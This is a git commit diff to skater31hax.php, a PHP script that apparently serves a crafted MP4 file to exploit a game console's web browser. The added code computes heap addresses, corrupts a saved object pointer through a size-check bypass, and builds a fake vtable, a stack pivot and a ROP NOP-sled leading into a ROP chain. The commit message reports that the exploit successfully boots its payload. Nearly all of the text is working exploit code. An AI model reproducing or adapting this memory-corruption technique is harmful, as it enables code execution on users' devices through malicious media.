929f312f76c0a507a21f43778e14e533c2388af8
yellows8 <yellows8@users.noreply.github.com>
2016-07-06 18:11:23 -0400

    Finished skater31hax, successfully boots *hax payload.

--- skater31hax.php
+++ skater31hax.php
@@ -12,6 +12,27 @@ if(($browserver & 0x80) == 0)
 	exit;
 }
 
+$url_len = strlen("http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']) + 1;//The address of the below mp4 buffer varies depending on the length of the requested URL. Only URLs with string length < 48 characters is currently supported(without updating the below code).
+$baseaddr = 0x39531f00;
+if($url_len < 33)
+{
+	$baseaddr = 0x39531ea0;
+}
+else
+{
+	if($url_len < 41)
+	{
+		$url_len-= 32;
+	}
+	else
+	{
+		$url_len-= 40;
+		$baseaddr = 0x39531f10;
+	}
+}
+$heapaddr_haxdatastart = /*0x39531c88*/$baseaddr+0x1318+0x4 + (($url_len + 0x3) & ~0x3);//Address within the *entire* mp4 buffer.
+$heapaddr_haxdatastart+= 0x4;
+
 $ROPHEAP = 0x10000000-0x1e000;
 
 $generatebinrop = 1;
@@ -42,16 +63,45 @@ $con.= pack("N*", 0x200+0x10);//Use +0x10 so that the actual low-u32 size is 0x2
 //If that's successful, it then calls mLastTrack->meta->setData() with the above buf and size. For loading the mLastTrack ptr, it loads the saved inr0 _this from sp+0x140, then it loads mLastTrack from there.
 
 //Hence, the size check can be bypassed by using a 64bit negative chunk_size, with whatever size you want to copy to stack for the low-word in the chunk_size, +0x10.
-//When the copy-size is large enough(see above), the saved _this ptr will be corrupted. A fake _this ptr and the data used with it has to be setup so that it doesn't crash with that.
+//When the copy-size is large enough(see above), the saved _this ptr will be corrupted. A fake _this ptr and the data used with it has to be setup so that it doesn't crash with that, hence this just does a stack-pivot with an object vtable funcptr call.
 
 //Setup the data copied to stack.
 for($i=0; $i<0x200; $i+=4)
 {
-	//TODO
-	//$con.= pack("V*", $POPPC);
+	$con.= pack("V*", $heapaddr_haxdatastart);//Overwrite the _this ptr(and other data which doesn't get used on stack) with $heapaddr_haxdatastart, address of the below data.
 }
 
-//$con.= $ROPCHAIN;//Beginning of the actual ROP.
+//Data used with the fake _this starts here. Another mp4 "chunk" would start here too, but that won't get parsed.
+
+for($i=0; $i<0x2000; $i+=4)
+{
+	$con.= pack("V*", $heapaddr_haxdatastart+0x2000);//Setup the mLastTrack ptr, address of the below data.
+}
+
+for($i=0; $i<0x2000; $i+=4)
+{
+	$con.= pack("V*", $heapaddr_haxdatastart+0x4000);//Setup the meta ptr from mLastTrack, address of the below data.
+}
+
+for($i=0; $i<(0x2000/0x10); $i++)//This is where the object data for the above objectptr(meta) is located.
+{
+	$con.= pack("V*", $heapaddr_haxdatastart+0x6000);//Fake vtable ptr, the 0x34-bytes starting here is also popped into r0..ip during stack-pivot.
+	$con.= pack("V*", $heapaddr_haxdatastart+0x8000);//Setup sp for the stack-pivot.
+	$con.= pack("V*", $POPPC);//Setup lr for the stack-pivot.
+	$con.= pack("V*", $POPPC);//Setup pc for the stack-pivot.
+}
+
+for($i=0; $i<0x2000; $i+=4)//This is where the fake vtable for the above object is located.
+{
+	$con.= pack("V*", $STACKPIVOT_ADR);
+}
+
+for($i=0; $i<0x2000; $i+=4)//This is where the ROP stack is located, starting with a ROP NOP-sled.
+{
+	$con.= pack("V*", $POPPC);
+}
+
+$con.= $ROPCHAIN;//Beginning of the actual ROP.
 
 header("Content-Type: video/mp4");
 
